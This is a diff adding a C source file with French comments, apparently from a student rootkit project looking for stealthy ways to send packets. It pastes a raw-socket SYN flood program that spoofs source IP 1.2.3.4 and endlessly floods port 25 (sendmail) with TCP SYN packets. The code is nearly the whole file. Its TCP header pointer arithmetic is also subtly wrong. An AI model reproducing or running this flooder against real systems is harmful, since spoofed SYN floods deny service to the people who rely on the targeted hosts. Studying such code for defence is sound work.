@@ -1,0 +1,99 @@
+/// J'ai cherché trouver une manière de d'envoyer des paquets HTTP de manière furtive, mais je n'en ai pas trouvé.
+/// J'essaie donc de trouver une manière d'envoyer des paquets ethernet, j'ai trouvé ça dans le rapport qui a été fait
+/// par le prof lui même sur les rootkits.
+
+/// Voici le premier code que j'avais trouvé pour l'implémentation d'un raw socket 
+
+#define __USE_BSD	/* utilise bsd'ish ip header */
+#include <sys/socket.h>	/* Ces entetes sont pour un systeme Linux, mais*/
+#include <netinet/in.h>	/* mais les noms sur les autres systemes sont faciles a deviner*/
+#include <netinet/ip.h>
+#define __FAVOR_BSD	/* utilise bsd'ish tcp header */
+#include <netinet/tcp.h>
+#include <unistd.h>
+
+#define P 25		/* Floodons le port sendmail  */
+
+unsigned short		/* Cette fonction genere des controles sur les entetes*/
+csum (unsigned short *buf, int nwords)
+{
+  unsigned long sum;
+  for (sum = 0; nwords > 0; nwords--)
+    sum += *buf++;
+  sum = (sum >> 16) + (sum & 0xffff);
+  sum += (sum >> 16);
+  return ~sum;
+}
+
+int 
+main (void)
+{
+  int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);	/* Ouverture raw socket */
+  char datagram[4096];	/* Ce buffer contiendra l'entete IPn l'entete TCP et le contenu. Nous pointons une structure d'entete IP a son commencement
+			    et une structure d'entete TCP apres cela pour ecrire la valeur de l'entete a l'interieur */
+
+  struct ip *iph = (struct ip *) datagram;
+  struct tcphdr *tcph = (struct tcphdr *) datagram + sizeof (struct ip);
+  struct sockaddr_in sin;
+			/* Le sockaddr_in contient l'adresse de destination. Il est utilise dans le sendto() pour determiner le chemin des datagrammes */
+
+  sin.sin_family = AF_INET;
+  sin.sin_port = htons (P);/* you byte-order >1byte header values to network
+			      byte order (not needed on big endian machines) */
+  sin.sin_addr.s_addr = inet_addr ("127.0.0.1");
+
+  memset (datagram, 0, 4096);	/* zero out the buffer */
+
+/*Nous remplissons maintenant les valeurs des entetes IP/TCP, voir en dessous pour les explications. */
+  iph->ip_hl = 5;
+  iph->ip_v = 4;
+  iph->ip_tos = 0;
+  iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);	/* pas de contenu */
+  iph->ip_id = htonl (54321);	/* La valeur n'a pas d'importance ici */
+  iph->ip_off = 0;
+  iph->ip_ttl = 255;
+  iph->ip_p = 6;
+  iph->ip_sum = 0;		/* mettre la valeur a  0 avant de calculer la somme de controle actuelle */
+  iph->ip_src.s_addr = inet_addr ("1.2.3.4");/* SYN peut etre spoofe */
+  iph->ip_dst.s_addr = sin.sin_addr.s_addr;
+  tcph->th_sport = htons (1234);	/* port arbitraire */
+  tcph->th_dport = htons (P);
+  tcph->th_seq = random ();/* dans un paquet SYN , la sequence numerique est aleatoire*/
+  tcph->th_ack = 0;/* et la sequence ack est 0 dans le premier paquet */
+  tcph->th_x2 = 0;
+  tcph->th_off = 0;		/* Premier et unique segment TCP */
+  tcph->th_flags = TH_SYN;	/* Demande de connection initial */
+  tcph->th_win = htonl (65535);	/* Taille maximum de la fenetre utillisee */
+  tcph->th_sum = 0;/* Si vous mettez le controle a 0, votre pile IP centrale se remplira correctement durant la transmission */
+  tcph->th_urp = 0;
+
+  iph->ip_sum = csum ((unsigned short *) datagram, iph->ip_len >> 1);
+
+/* Finalement, il est recommande de faire un appel IP_HDRINCL, pour etre sure que le noyau sait que l'entete est incluse dans les donnees et non pas dans le paquet 
+avant celui des donnees */
+
+  {				/* ... */
+    int one = 1;
+    const int *val = &one;
+    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
+      printf ("Warning: Cannot set HDRINCL!\n");
+  }
+
+  while (1)
+    {
+      if (sendto (s,		/* Notre socket */
+		  datagram,	/* le buffer contenant les entetes et les donnees */
+		  iph->ip_len,	/* taille totale de notre datagramme */
+		  0,		/* indicateur de routage, normalement toujours a 0 */
+		  (struct sockaddr *) &sin,	/* socket addr, comme dans un */
+		  sizeof (sin)) < 0)		/* send() normal */
+	printf ("error\n");
+      else
+	printf (".");
+    }
+
+  return 0;
+}
+
+
+
